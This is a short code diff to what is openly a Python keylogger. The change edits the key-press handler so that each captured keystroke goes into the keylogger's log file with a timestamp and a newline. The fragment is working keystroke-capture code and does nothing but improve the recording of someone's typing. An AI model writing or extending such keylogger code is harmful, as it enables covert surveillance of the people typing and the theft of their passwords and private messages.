@@ -22,7 +22,7 @@ import datetime
 
 def on_press(key):
     with open(file=keylogger_log_path, mode='a') as file:
-        file.write(str(key))
+        file.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}-{str(key)}\n")
 
 
 keylogger_active = False
